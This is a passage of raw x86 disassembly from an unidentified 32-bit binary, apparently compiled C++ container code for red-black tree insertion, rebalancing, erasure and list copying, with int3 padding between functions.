   1ac03:	mov    edi,eax
   1ac05:	lea    eax,[edi+edi*1]
   1ac08:	push   eax
   1ac09:	call   0x1aa10
   1ac0e:	lea    ecx,[eax+edi*4]
   1ac11:	mov    DWORD PTR [ecx],esi
   1ac13:	push   eax
   1ac14:	push   DWORD PTR [ebx+0xc]
   1ac17:	mov    DWORD PTR [ebp-0x4],ecx
   1ac1a:	lea    ecx,[ebp-0x18]
   1ac1d:	call   0x1a324
   1ac22:	push   DWORD PTR [ebp-0x4]
   1ac25:	lea    edi,[ebx+0x4]
   1ac28:	push   DWORD PTR [ebp-0x8]
   1ac2b:	mov    esi,eax
   1ac2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac31:	lea    ecx,[ebp-0x18]
   1ac34:	call   0x1a324
   1ac39:	lea    edi,[ebx+0x14]
   1ac3c:	mov    esi,eax
   1ac3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac42:	pop    edi
   1ac43:	pop    esi
   1ac44:	pop    ebx
   1ac45:	leave  
   1ac46:	ret    
   1ac47:	int3   
   1ac48:	int3   
   1ac49:	int3   
   1ac4a:	int3   
   1ac4b:	int3   
   1ac4c:	mov    edi,edi
   1ac4e:	push   ebp
   1ac4f:	mov    ebp,esp
   1ac51:	mov    eax,DWORD PTR [ebp+0xc]
   1ac54:	push   ebx
   1ac55:	push   esi
   1ac56:	push   edi
   1ac57:	lea    edi,[eax+0x4]
   1ac5a:	push   DWORD PTR [edi]
   1ac5c:	mov    ebx,ecx
   1ac5e:	push   eax
   1ac5f:	call   0x1a9c4
   1ac64:	push   DWORD PTR [ebp+0x10]
   1ac67:	mov    esi,eax
   1ac69:	mov    DWORD PTR [edi],esi
   1ac6b:	mov    eax,DWORD PTR [esi+0x4]
   1ac6e:	mov    DWORD PTR [eax],esi
   1ac70:	lea    eax,[esi+0x8]
   1ac73:	push   eax
   1ac74:	call   0x11658
   1ac79:	mov    eax,DWORD PTR [ebp+0x8]
   1ac7c:	inc    DWORD PTR [ebx+0x8]
   1ac7f:	pop    edi
   1ac80:	mov    DWORD PTR [eax],esi
   1ac82:	pop    esi
   1ac83:	pop    ebx
   1ac84:	pop    ebp
   1ac85:	ret    0xc
   1ac88:	int3   
   1ac89:	int3   
   1ac8a:	int3   
   1ac8b:	int3   
   1ac8c:	int3   
   1ac8d:	int3   
   1ac8e:	mov    edi,edi
   1ac90:	push   ebp
   1ac91:	mov    ebp,esp
   1ac93:	push   ecx
   1ac94:	mov    eax,DWORD PTR [ebp+0xc]
   1ac97:	push   esi
   1ac98:	mov    esi,ecx
   1ac9a:	jmp    0x1acb6
   1ac9c:	add    eax,0x8
   1ac9f:	push   eax
   1aca0:	push   DWORD PTR [ebp+0x8]
   1aca3:	lea    eax,[ebp-0x4]
   1aca6:	push   eax
   1aca7:	mov    ecx,esi
   1aca9:	call   0x1ac4c
   1acae:	mov    eax,DWORD PTR [ebp+0xc]
   1acb1:	mov    eax,DWORD PTR [eax]
   1acb3:	mov    DWORD PTR [ebp+0xc],eax
   1acb6:	cmp    eax,DWORD PTR [ebp+0x10]
   1acb9:	jne    0x1ac9c
   1acbb:	pop    esi
   1acbc:	leave  
   1acbd:	ret    0xc
   1acc0:	int3   
   1acc1:	int3   
   1acc2:	int3   
   1acc3:	int3   
   1acc4:	int3   
   1acc5:	int3   
   1acc6:	mov    edi,edi
   1acc8:	push   ebp
   1acc9:	mov    ebp,esp
   1accb:	push   esi
   1accc:	push   edi
   1accd:	push   DWORD PTR [ebp+0xc]
   1acd0:	mov    edi,ecx
   1acd2:	call   0x1a604
   1acd7:	push   DWORD PTR [ebp+0xc]
   1acda:	mov    ecx,edi
   1acdc:	mov    esi,eax
   1acde:	call   0x1a5c4
   1ace3:	mov    ecx,DWORD PTR [ebp+0x8]
   1ace6:	pop    edi
   1ace7:	mov    DWORD PTR [ecx],eax
   1ace9:	mov    DWORD PTR [ecx+0x4],esi
   1acec:	mov    eax,ecx
   1acee:	pop    esi
   1acef:	pop    ebp
   1acf0:	ret    0x8
   1acf3:	int3   
   1acf4:	int3   
   1acf5:	int3   
   1acf6:	int3   
   1acf7:	int3   
   1acf8:	mov    edi,edi
   1acfa:	push   ebp
   1acfb:	mov    ebp,esp
   1acfd:	push   ecx
   1acfe:	push   ebx
   1acff:	push   esi
   1ad00:	push   edi
   1ad01:	push   0x1
   1ad03:	xor    edi,edi
   1ad05:	push   edi
   1ad06:	mov    esi,ecx
   1ad08:	call   0x1395c
   1ad0d:	lea    ecx,[ebp-0x1]
   1ad10:	mov    ebx,eax
   1ad12:	call   DWORD PTR ds:0x7df8c
   1ad18:	cmp    DWORD PTR ds:0x7f89c,edi
   1ad1e:	jne    0x1ad33
   1ad20:	mov    eax,ebx
   1ad22:	mov    ds:0x7f89c,eax
   1ad27:	mov    DWORD PTR [eax],edi
   1ad29:	mov    eax,ds:0x7f89c
   1ad2e:	xor    ebx,ebx
   1ad30:	mov    DWORD PTR [eax+0x8],edi
   1ad33:	inc    DWORD PTR ds:0x7f8a0
   1ad39:	lea    ecx,[ebp-0x1]
   1ad3c:	call   DWORD PTR ds:0x7df88
   1ad42:	cmp    ebx,edi
   1ad44:	je     0x1ad4d
   1ad46:	push   ebx
   1ad47:	call   0x10a9a
   1ad4c:	pop    ecx
   1ad4d:	push   edi
   1ad4e:	push   DWORD PTR ds:0x7f89c
   1ad54:	mov    ecx,esi
   1ad56:	call   0x1395c
   1ad5b:	mov    DWORD PTR [esi+0xc],edi
   1ad5e:	mov    DWORD PTR [esi+0x4],eax
   1ad61:	mov    DWORD PTR [eax],eax
   1ad63:	mov    esi,DWORD PTR [esi+0x4]
   1ad66:	pop    edi
   1ad67:	mov    DWORD PTR [esi+0x8],esi
   1ad6a:	pop    esi
   1ad6b:	pop    ebx
   1ad6c:	leave  
   1ad6d:	ret    
   1ad6e:	int3   
   1ad6f:	int3   
   1ad70:	int3   
   1ad71:	int3   
   1ad72:	int3   
   1ad73:	int3   
   1ad74:	mov    edi,edi
   1ad76:	push   ebp
   1ad77:	mov    ebp,esp
   1ad79:	push   ebx
   1ad7a:	push   esi
   1ad7b:	mov    esi,DWORD PTR [ebp+0x10]
   1ad7e:	push   edi
   1ad7f:	push   0x0
   1ad81:	push   esi
   1ad82:	mov    edi,ecx
   1ad84:	call   0x1395c
   1ad89:	push   DWORD PTR [ebp+0x14]
   1ad8c:	mov    ebx,eax
   1ad8e:	mov    eax,ds:0x7f89c
   1ad93:	mov    DWORD PTR [ebx],eax
   1ad95:	mov    eax,ds:0x7f89c
   1ad9a:	mov    DWORD PTR [ebx+0x8],eax
   1ad9d:	lea    eax,[ebx+0xc]
   1ada0:	push   eax
   1ada1:	call   0x1a644
   1ada6:	inc    DWORD PTR [edi+0xc]
   1ada9:	cmp    esi,DWORD PTR [edi+0x4]
   1adac:	je     0x1add6
   1adae:	mov    eax,DWORD PTR [ebp+0xc]
   1adb1:	cmp    eax,DWORD PTR ds:0x7f89c
   1adb7:	jne    0x1add6
   1adb9:	lea    eax,[esi+0xc]
   1adbc:	push   eax
   1adbd:	push   DWORD PTR [ebp+0x14]
   1adc0:	call   0x197e8
   1adc5:	test   al,al
   1adc7:	jne    0x1add6
   1adc9:	mov    DWORD PTR [esi+0x8],ebx
   1adcc:	mov    eax,DWORD PTR [edi+0x4]
   1adcf:	cmp    esi,DWORD PTR [eax+0x8]
   1add2:	jne    0x1adf0
   1add4:	jmp    0x1ade5
   1add6:	mov    DWORD PTR [esi],ebx
   1add8:	mov    eax,DWORD PTR [edi+0x4]
   1addb:	cmp    esi,eax
   1addd:	jne    0x1adea
   1addf:	mov    DWORD PTR [eax+0x4],ebx
   1ade2:	mov    eax,DWORD PTR [edi+0x4]
   1ade5:	mov    DWORD PTR [eax+0x8],ebx
   1ade8:	jmp    0x1adf0
   1adea:	cmp    esi,DWORD PTR [eax]
   1adec:	jne    0x1adf0
   1adee:	mov    DWORD PTR [eax],ebx
   1adf0:	mov    eax,DWORD PTR [edi+0x4]
   1adf3:	mov    esi,ebx
   1adf5:	cmp    ebx,DWORD PTR [eax+0x4]
   1adf8:	je     0x1aeac
   1adfe:	mov    eax,DWORD PTR [esi+0x4]
   1ae01:	xor    edx,edx
   1ae03:	cmp    DWORD PTR [eax+0x14],edx
   1ae06:	jne    0x1aeac
   1ae0c:	mov    ecx,DWORD PTR [eax+0x4]
   1ae0f:	cmp    eax,DWORD PTR [ecx]
   1ae11:	jne    0x1ae4d
   1ae13:	mov    ecx,DWORD PTR [ecx+0x8]
   1ae16:	cmp    DWORD PTR [ecx+0x14],edx
   1ae19:	je     0x1ae54
   1ae1b:	cmp    esi,DWORD PTR [eax+0x8]
   1ae1e:	jne    0x1ae2a
   1ae20:	mov    esi,eax
   1ae22:	push   esi
   1ae23:	mov    ecx,edi
   1ae25:	call   0x1a4e6
   1ae2a:	mov    eax,DWORD PTR [esi+0x4]
   1ae2d:	mov    DWORD PTR [eax+0x14],0x1
   1ae34:	mov    eax,DWORD PTR [esi+0x4]
   1ae37:	mov    eax,DWORD PTR [eax+0x4]
   1ae3a:	and    DWORD PTR [eax+0x14],0x0
   1ae3e:	mov    eax,DWORD PTR [esi+0x4]
   1ae41:	push   DWORD PTR [eax+0x4]
   1ae44:	mov    ecx,edi
   1ae46:	call   0x1a534
   1ae4b:	jmp    0x1aea0
   1ae4d:	mov    ecx,DWORD PTR [ecx]
   1ae4f:	cmp    DWORD PTR [ecx+0x14],edx
   1ae52:	jne    0x1ae71
   1ae54:	mov    edx,eax
   1ae56:	xor    eax,eax
   1ae58:	inc    eax
   1ae59:	mov    DWORD PTR [edx+0x14],eax
   1ae5c:	mov    DWORD PTR [ecx+0x14],eax
   1ae5f:	mov    eax,DWORD PTR [esi+0x4]
   1ae62:	mov    eax,DWORD PTR [eax+0x4]
   1ae65:	and    DWORD PTR [eax+0x14],0x0
   1ae69:	mov    eax,DWORD PTR [esi+0x4]
   1ae6c:	mov    esi,DWORD PTR [eax+0x4]
   1ae6f:	jmp    0x1aea0
   1ae71:	cmp    esi,DWORD PTR [eax]
   1ae73:	jne    0x1ae7f
   1ae75:	mov    esi,eax
   1ae77:	push   esi
   1ae78:	mov    ecx,edi
   1ae7a:	call   0x1a534
   1ae7f:	mov    eax,DWORD PTR [esi+0x4]
   1ae82:	mov    DWORD PTR [eax+0x14],0x1
   1ae89:	mov    eax,DWORD PTR [esi+0x4]
   1ae8c:	mov    eax,DWORD PTR [eax+0x4]
   1ae8f:	and    DWORD PTR [eax+0x14],0x0
   1ae93:	mov    eax,DWORD PTR [esi+0x4]
   1ae96:	push   DWORD PTR [eax+0x4]
   1ae99:	mov    ecx,edi
   1ae9b:	call   0x1a4e6
   1aea0:	mov    eax,DWORD PTR [edi+0x4]
   1aea3:	cmp    esi,DWORD PTR [eax+0x4]
   1aea6:	jne    0x1adfe
   1aeac:	mov    eax,DWORD PTR [edi+0x4]
   1aeaf:	mov    eax,DWORD PTR [eax+0x4]
   1aeb2:	pop    edi
   1aeb3:	mov    DWORD PTR [eax+0x14],0x1
   1aeba:	mov    eax,DWORD PTR [ebp+0x8]
   1aebd:	pop    esi
   1aebe:	mov    DWORD PTR [eax],ebx
   1aec0:	pop    ebx
   1aec1:	pop    ebp
   1aec2:	ret    0x10
   1aec5:	int3   
   1aec6:	int3   
   1aec7:	int3   
   1aec8:	int3   
   1aec9:	int3   
   1aeca:	mov    edi,edi
   1aecc:	push   ebp
   1aecd:	mov    ebp,esp
   1aecf:	sub    esp,0x10
   1aed2:	push   ebx
   1aed3:	push   esi
   1aed4:	mov    DWORD PTR [ebp-0xc],ecx
   1aed7:	push   edi
   1aed8:	mov    edi,DWORD PTR [ebp+0xc]
   1aedb:	lea    ecx,[ebp+0xc]
   1aede:	call   0x1a394
   1aee3:	mov    esi,DWORD PTR [edi]
   1aee5:	mov    eax,ds:0x7f89c
   1aeea:	lea    ebx,[edi+0x8]
   1aeed:	mov    DWORD PTR [ebp-0x8],edi
   1aef0:	mov    DWORD PTR [ebp-0x10],ebx
   1aef3:	cmp    esi,eax
   1aef5:	jne    0x1aefb
   1aef7:	mov    esi,DWORD PTR [ebx]
   1aef9:	jmp    0x1af12
   1aefb:	mov    ecx,DWORD PTR [ebx]
   1aefd:	cmp    ecx,eax
   1aeff:	je     0x1af12
   1af01:	push   ecx
   1af02:	call   0x1a372
   1af07:	mov    DWORD PTR [ebp-0x8],eax
   1af0a:	add    eax,0x8
   1af0d:	mov    esi,DWORD PTR [eax]
   1af0f:	mov    DWORD PTR [ebp-0x10],eax
   1af12:	lea    ecx,[ebp-0x1]
   1af15:	call   DWORD PTR ds:0x7df8c
   1af1b:	mov    eax,DWORD PTR [ebp-0x8]
   1af1e:	cmp    eax,edi
   1af20:	je     0x1af82
   1af22:	mov    ecx,DWORD PTR [edi]
   1af24:	mov    DWORD PTR [ecx+0x4],eax
   1af27:	mov    ecx,DWORD PTR [edi]
   1af29:	mov    DWORD PTR [eax],ecx
   1af2b:	cmp    eax,DWORD PTR [ebx]
   1af2d:	jne    0x1af34
   1af2f:	mov    DWORD PTR [esi+0x4],eax
   1af32:	jmp    0x1af4b
   1af34:	mov    ecx,DWORD PTR [eax+0x4]
   1af37:	mov    edx,DWORD PTR [ebp-0x10]
   1af3a:	mov    DWORD PTR [esi+0x4],ecx
   1af3d:	mov    ecx,DWORD PTR [eax+0x4]
   1af40:	mov    DWORD PTR [ecx],esi
   1af42:	mov    ecx,DWORD PTR [ebx]
   1af44:	mov    DWORD PTR [edx],ecx
   1af46:	mov    ecx,DWORD PTR [ebx]
   1af48:	mov    DWORD PTR [ecx+0x4],eax
   1af4b:	mov    ebx,DWORD PTR [ebp-0xc]
   1af4e:	mov    ecx,DWORD PTR [ebx+0x4]
   1af51:	cmp    DWORD PTR [ecx+0x4],edi
   1af54:	jne    0x1af5b
   1af56:	mov    DWORD PTR [ecx+0x4],eax
   1af59:	jmp    0x1af69
   1af5b:	mov    ecx,DWORD PTR [edi+0x4]
   1af5e:	cmp    DWORD PTR [ecx],edi
   1af60:	jne    0x1af66
   1af62:	mov    DWORD PTR [ecx],eax
   1af64:	jmp    0x1af69
   1af66:	mov    DWORD PTR [ecx+0x8],eax
   1af69:	mov    ecx,DWORD PTR [edi+0x4]
   1af6c:	mov    DWORD PTR [eax+0x4],ecx
   1af6f:	mov    ecx,DWORD PTR [eax+0x14]
   1af72:	mov    edx,DWORD PTR [edi+0x14]
   1af75:	mov    DWORD PTR [eax+0x14],edx
   1af78:	mov    DWORD PTR [edi+0x14],ecx
   1af7b:	mov    DWORD PTR [ebp-0x8],edi
   1af7e:	mov    eax,edi
   1af80:	jmp    0x1affb
   1af82:	mov    ecx,DWORD PTR [eax+0x4]
   1af85:	mov    edx,DWORD PTR [ebp-0xc]
   1af88:	mov    DWORD PTR [esi+0x4],ecx
   1af8b:	mov    ecx,DWORD PTR [edx+0x4]
   1af8e:	cmp    DWORD PTR [ecx+0x4],edi
   1af91:	jne    0x1af98
   1af93:	mov    DWORD PTR [ecx+0x4],esi
   1af96:	jmp    0x1afa6
   1af98:	mov    ecx,DWORD PTR [edi+0x4]
   1af9b:	cmp    DWORD PTR [ecx],edi
   1af9d:	jne    0x1afa3
   1af9f:	mov    DWORD PTR [ecx],esi
   1afa1:	jmp    0x1afa6
   1afa3:	mov    DWORD PTR [ecx+0x8],esi
   1afa6:	mov    ecx,DWORD PTR [edx+0x4]
   1afa9:	mov    DWORD PTR [ebp-0x10],ecx
   1afac:	cmp    DWORD PTR [ecx],edi
   1afae:	jne    0x1afd2
   1afb0:	mov    ebx,DWORD PTR [ebx]
   1afb2:	cmp    ebx,DWORD PTR ds:0x7f89c
   1afb8:	jne    0x1afc1
   1afba:	mov    ebx,DWORD PTR [edi+0x4]
   1afbd:	mov    DWORD PTR [ecx],ebx
   1afbf:	jmp    0x1afd2
   1afc1:	push   esi
   1afc2:	call   0x1a372
   1afc7:	mov    ecx,DWORD PTR [ebp-0x10]
   1afca:	mov    edx,DWORD PTR [ebp-0xc]
   1afcd:	mov    DWORD PTR [ecx],eax
   1afcf:	mov    eax,DWORD PTR [ebp-0x8]
   1afd2:	mov    ebx,DWORD PTR [edx+0x4]
   1afd5:	cmp    DWORD PTR [ebx+0x8],edi
   1afd8:	jne    0x1aff8
   1afda:	mov    ecx,DWORD PTR [edi]
   1afdc:	cmp    ecx,DWORD PTR ds:0x7f89c
   1afe2:	jne    0x1afec
   1afe4:	mov    ecx,DWORD PTR [edi+0x4]
   1afe7:	mov    DWORD PTR [ebx+0x8],ecx
   1afea:	jmp    0x1aff8
   1afec:	push   esi
   1afed:	call   0x1a350
   1aff2:	mov    DWORD PTR [ebx+0x8],eax
   1aff5:	mov    eax,DWORD PTR [ebp-0x8]
   1aff8:	mov    ebx,DWORD PTR [ebp-0xc]
   1affb:	xor    edi,edi
   1affd:	inc    edi
   1affe:	cmp    DWORD PTR [eax+0x14],edi
   1b001:	jne    0x1b115
   1b007:	jmp    0x1b0c8
   1b00c:	cmp    DWORD PTR [esi+0x14],edi
   1b00f:	jne    0x1b112
   1b015:	mov    eax,DWORD PTR [esi+0x4]
   1b018:	cmp    esi,DWORD PTR [eax]
   1b01a:	jne    0x1b091
   1b01c:	mov    eax,DWORD PTR [eax+0x8]
   1b01f:	cmp    DWORD PTR [eax+0x14],0x0
   1b023:	jne    0x1b03f
   1b025:	mov    DWORD PTR [eax+0x14],edi
   1b028:	mov    eax,DWORD PTR [esi+0x4]
   1b02b:	and    DWORD PTR [eax+0x14],0x0
   1b02f:	push   DWORD PTR [esi+0x4]
   1b032:	mov    ecx,ebx
   1b034:	call   0x1a4e6
   1b039:	mov    eax,DWORD PTR [esi+0x4]
   1b03c:	mov    eax,DWORD PTR [eax+0x8]
   1b03f:	mov    ecx,DWORD PTR [eax]
   1b041:	cmp    DWORD PTR [ecx+0x14],edi
   1b044:	jne    0x1b04e
   1b046:	mov    ecx,DWORD PTR [eax+0x8]
   1b049:	cmp    DWORD PTR [ecx+0x14],edi
   1b04c:	je     0x1b0c1
   1b04e:	mov    ecx,DWORD PTR [eax+0x8]
   1b051:	cmp    DWORD PTR [ecx+0x14],edi
   1b054:	jne    0x1b06d
   1b056:	mov    ecx,DWORD PTR [eax]
   1b058:	mov    DWORD PTR [ecx+0x14],edi
   1b05b:	and    DWORD PTR [eax+0x14],0x0
   1b05f:	push   eax
   1b060:	mov    ecx,ebx
   1b062:	call   0x1a534
   1b067:	mov    eax,DWORD PTR [esi+0x4]
   1b06a:	mov    eax,DWORD PTR [eax+0x8]
   1b06d:	mov    ecx,DWORD PTR [esi+0x4]
   1b070:	mov    ecx,DWORD PTR [ecx+0x14]
   1b073:	mov    DWORD PTR [eax+0x14],ecx
   1b076:	mov    ecx,DWORD PTR [esi+0x4]
   1b079:	mov    DWORD PTR [ecx+0x14],edi
   1b07c:	mov    eax,DWORD PTR [eax+0x8]
   1b07f:	mov    DWORD PTR [eax+0x14],edi
   1b082:	push   DWORD PTR [esi+0x4]
   1b085:	mov    ecx,ebx
   1b087:	call   0x1a4e6
   1b08c:	jmp    0x1b112
   1b091:	mov    eax,DWORD PTR [eax]
   1b093:	cmp    DWORD PTR [eax+0x14],0x0
   1b097:	jne    0x1b0b2
   1b099:	mov    DWORD PTR [eax+0x14],edi
   1b09c:	mov    eax,DWORD PTR [esi+0x4]
   1b09f:	and    DWORD PTR [eax+0x14],0x0
   1b0a3:	push   DWORD PTR [esi+0x4]
   1b0a6:	mov    ecx,ebx
   1b0a8:	call   0x1a534
   1b0ad:	mov    eax,DWORD PTR [esi+0x4]
   1b0b0:	mov    eax,DWORD PTR [eax]
   1b0b2:	mov    ecx,DWORD PTR [eax+0x8]
   1b0b5:	cmp    DWORD PTR [ecx+0x14],edi
   1b0b8:	jne    0x1b0d6
   1b0ba:	mov    ecx,DWORD PTR [eax]
   1b0bc:	cmp    DWORD PTR [ecx+0x14],edi
   1b0bf:	jne    0x1b0d6
   1b0c1:	and    DWORD PTR [eax+0x14],0x0
   1b0c5:	mov    esi,DWORD PTR [esi+0x4]
   1b0c8:	mov    eax,DWORD PTR [ebx+0x4]
   1b0cb:	cmp    esi,DWORD PTR [eax+0x4]
   1b0ce:	jne    0x1b00c
   1b0d4:	jmp    0x1b112
   1b0d6:	mov    ecx,DWORD PTR [eax]
   1b0d8:	cmp    DWORD PTR [ecx+0x14],edi
   1b0db:	jne    0x1b0f4
   1b0dd:	mov    ecx,DWORD PTR [eax+0x8]
   1b0e0:	mov    DWORD PTR [ecx+0x14],edi
   1b0e3:	and    DWORD PTR [eax+0x14],0x0
   1b0e7:	push   eax
   1b0e8:	mov    ecx,ebx
   1b0ea:	call   0x1a4e6
   1b0ef:	mov    eax,DWORD PTR [esi+0x4]
   1b0f2:	mov    eax,DWORD PTR [eax]
   1b0f4:	mov    ecx,DWORD PTR [esi+0x4]
   1b0f7:	mov    ecx,DWORD PTR [ecx+0x14]
   1b0fa:	mov    DWORD PTR [eax+0x14],ecx
   1b0fd:	mov    ecx,DWORD PTR [esi+0x4]
   1b100:	mov    DWORD PTR [ecx+0x14],edi
   1b103:	mov    eax,DWORD PTR [eax]
   1b105:	mov    DWORD PTR [eax+0x14],edi
   1b108:	push   DWORD PTR [esi+0x4]
   1b10b:	mov    ecx,ebx
   1b10d:	call   0x1a534
   1b112:	mov    DWORD PTR [esi+0x14],edi
   1b115:	lea    ecx,[ebp-0x1]
   1b118:	call   DWORD PTR ds:0x7df88
   1b11e:	mov    esi,DWORD PTR [ebp-0x8]
   1b121:	lea    eax,[esi+0xc]
   1b124:	push   eax
   1b125:	call   0x1a662
   1b12a:	push   esi
   1b12b:	call   0x10a9a
   1b130:	mov    eax,DWORD PTR [ebp+0x8]
   1b133:	dec    DWORD PTR [ebx+0xc]
   1b136:	pop    ecx
   1b137:	mov    ecx,DWORD PTR [ebp+0xc]
   1b13a:	pop    edi
   1b13b:	pop    esi
   1b13c:	mov    DWORD PTR [eax],ecx
   1b13e:	pop    ebx
   1b13f:	leave  
   1b140:	ret    0x8
   1b143:	int3   
   1b144:	int3   
   1b145:	int3   
   1b146:	int3   
   1b147:	int3   
   1b148:	mov    edi,edi
   1b14a:	push   ebp
   1b14b:	mov    ebp,esp
   1b14d:	push   ebx
   1b14e:	push   esi
   1b14f:	push   edi
   1b150:	mov    edi,DWORD PTR [ebp+0x8]
   1b153:	mov    ebx,ecx
   1b155:	mov    esi,edi
   1b157:	cmp    edi,DWORD PTR ds:0x7f89c
   1b15d:	je     0x1b185
   1b15f:	push   DWORD PTR [esi+0x8]
   1b162:	mov    ecx,ebx
   1b164:	call   0x1b148
   1b169:	mov    esi,DWORD PTR [esi]
   1b16b:	lea    eax,[edi+0xc]
   1b16e:	push   eax
   1b16f:	call   0x1a662
   1b174:	push   edi
   1b175:	call   0x10a9a
   1b17a:	pop    ecx
   1b17b:	mov    edi,esi
   1b17d:	cmp    esi,DWORD PTR ds:0x7f89c
   1b183:	jne    0x1b15f
   1b185:	pop    edi
   1b186:	pop    esi
   1b187:	pop    ebx
   1b188:	pop    ebp
   1b189:	ret    0x4
   1b18c:	int3   
   1b18d:	int3   
   1b18e:	int3   
   1b18f:	int3   
   1b190:	int3   
   1b191:	int3   
   1b192:	mov    edi,edi
   1b194:	push   esi
   1b195:	mov    esi,ecx
   1b197:	jmp    0x1b1a0
   1b199:	mov    ecx,esi
   1b19b:	call   0x1aaf0
   1b1a0:	cmp    DWORD PTR [esi+0x2c],0x0
   1b1a4:	jne    0x1b199
   1b1a6:	pop    esi
   1b1a7:	ret    
   1b1a8:	int3   
   1b1a9:	int3   
   1b1aa:	int3   
   1b1ab:	int3   
   1b1ac:	int3   
   1b1ad:	int3   
   1b1ae:	mov    edi,edi
   1b1b0:	push   ebp
   1b1b1:	mov    ebp,esp
   1b1b3:	push   esi
   1b1b4:	mov    esi,ecx
   1b1b6:	cmp    DWORD PTR [esi+0x2c],0x0
   1b1ba:	je     0x1b1e2
   1b1bc:	mov    ecx,DWORD PTR [esi+0x1c]
   1b1bf:	mov    edx,DWORD PTR [esi+0x18]
   1b1c2:	cmp    ecx,edx
   1b1c4:	je     0x1b1e2
   1b1c6:	push   DWORD PTR [ebp+0x8]
   1b1c9:	lea    eax,[ecx+0x4]
   1b1cc:	mov    DWORD PTR [esi+0x1c],eax
   1b1cf:	push   ecx
   1b1d0:	cmp    eax,edx
   1b1d2:	jne    0x1b1f6
   1b1d4:	call   0x11658
   1b1d9:	mov    ecx,esi
   1b1db:	call   0x1ab82
   1b1e0:	jmp    0x1b1fb
   1b1e2:	mov    ecx,esi
   1b1e4:	call   0x1ab82
   1b1e9:	mov    eax,DWORD PTR [esi+0x1c]
   1b1ec:	push   DWORD PTR [ebp+0x8]
   1b1ef:	lea    ecx,[eax+0x4]
   1b1f2:	mov    DWORD PTR [esi+0x1c],ecx
   1b1f5:	push   eax
   1b1f6:	call   0x11658
   1b1fb:	inc    DWORD PTR [esi+0x2c]
   1b1fe:	pop    esi
   1b1ff:	pop    ebp
   1b200:	ret    0x4
   1b203:	int3   
   1b204:	int3   
   1b205:	int3   
   1b206:	int3   
   1b207:	int3   
   1b208:	mov    edi,edi
   1b20a:	push   ebp
   1b20b:	mov    ebp,esp
   1b20d:	push   esi
   1b20e:	push   0x0
   1b210:	push   0xc
   1b212:	mov    esi,ecx
   1b214:	call   0x11636
   1b219:	mov    ecx,DWORD PTR [ebp+0x8]
   1b21c:	mov    DWORD PTR [eax],eax
   1b21e:	mov    DWORD PTR [eax+0x4],eax
   1b221:	and    DWORD PTR [esi+0x8],0x0
   1b225:	mov    DWORD PTR [esi+0x4],eax
   1b228:	mov    ecx,DWORD PTR [ecx+0x4]
   1b22b:	mov    edx,DWORD PTR [ecx]
   1b22d:	mov    eax,DWORD PTR [eax]
   1b22f:	push   ecx
   1b230:	push   edx
   1b231:	push   eax
   1b232:	mov    ecx,esi
   1b234:	call   0x1ac8e
   1b239:	mov    eax,esi
   1b23b:	pop    esi
   1b23c:	pop    ebp
   1b23d:	ret    0x4
   1b240:	int3   
   1b241:	int3   
   1b242:	int3   
   1b243:	int3   
   1b244:	int3   
   1b245:	int3   
   1b246:	mov    edi,edi
   1b248:	push   ebp
   1b249:	mov    ebp,esp
   1b24b:	push   ecx
   1b24c:	mov    edx,DWORD PTR [ebp+0x8]
   1b24f:	mov    DWORD PTR [ebp-0x4],ecx
   1b252:	cmp    ecx,edx
   1b254:	je     0x1b293
   1b256:	push   ebx
   1b257:	mov    ebx,DWORD PTR [edx+0x4]
   1b25a:	push   esi
   1b25b:	mov    esi,DWORD PTR [ecx+0x4]
   1b25e:	mov    eax,DWORD PTR [esi]
   1b260:	push   edi
   1b261:	mov    edi,DWORD PTR [ebx]
   1b263:	jmp    0x1b273
   1b265:	cmp    edi,ebx
   1b267:	je     0x1b277
   1b269:	mov    edx,DWORD PTR [edi+0x8]
   1b26c:	mov    DWORD PTR [eax+0x8],edx
   1b26f:	mov    eax,DWORD PTR [eax]
   1b271:	mov    edi,DWORD PTR [edi]
   1b273:	cmp    eax,esi
   1b275:	jne    0x1b265
   1b277:	push   esi
   1b278:	push   eax
   1b279:	lea    eax,[ebp+0x8]
   1b27c:	push   eax
   1b27d:	call   0x1a98e
   1b282:	mov    ecx,DWORD PTR [ebp-0x4]
   1b285:	push   ebx
   1b286:	push   edi
   1b287:	push   esi
   1b288:	call   0x1ac8e
   1b28d:	mov    ecx,DWORD PTR [ebp-0x4]
   1b290:	pop    edi
   1b291:	pop    esi
   1b292:	pop    ebx
   1b293:	mov    eax,ecx
   1b295:	leave  
   1b296:	ret    0x4
   1b299:	int3   
   1b29a:	int3   
   1b29b:	int3   
   1b29c:	int3   
   1b29d:	int3   
   1b29e:	mov    edi,edi
   1b2a0:	push   ebp
   1b2a1:	mov    ebp,esp
   1b2a3:	push   DWORD PTR [ebp+0x8]
   1b2a6:	mov    eax,DWORD PTR [ecx+0x4]
   1b2a9:	push   eax
   1b2aa:	lea    eax,[ebp+0x8]
   1b2ad:	push   eax
   1b2ae:	call   0x1ac4c
   1b2b3:	pop    ebp
   1b2b4:	ret    0x4
   1b2b7:	int3   
   1b2b8:	int3   
   1b2b9:	int3   
   1b2ba:	int3   
   1b2bb:	int3   
   1b2bc:	mov    edi,edi
   1b2be:	push   ebp
   1b2bf:	mov    ebp,esp
   1b2c1:	push   ecx
   1b2c2:	push   ebx
   1b2c3:	push   esi
   1b2c4:	push   edi
   1b2c5:	mov    edi,ecx
   1b2c7:	mov    eax,DWORD PTR [edi+0x4]
   1b2ca:	mov    esi,DWORD PTR [eax+0x4]
   1b2cd:	mov    ebx,eax
   1b2cf:	mov    al,0x1
   1b2d1:	jmp    0x1b2ec
   1b2d3:	lea    eax,[esi+0xc]
   1b2d6:	push   eax
   1b2d7:	push   DWORD PTR [ebp+0xc]
   1b2da:	mov    ebx,esi
   1b2dc:	call   0x197e8
   1b2e1:	test   al,al
   1b2e3:	je     0x1b2e9
   1b2e5:	mov    esi,DWORD PTR [esi]
   1b2e7:	jmp    0x1b2ec
   1b2e9:	mov    esi,DWORD PTR [esi+0x8]
   1b2ec:	cmp    esi,DWORD PTR ds:0x7f89c
   1b2f2:	jne    0x1b2d3
   1b2f4:	cmp    BYTE PTR [edi+0x8],0x0
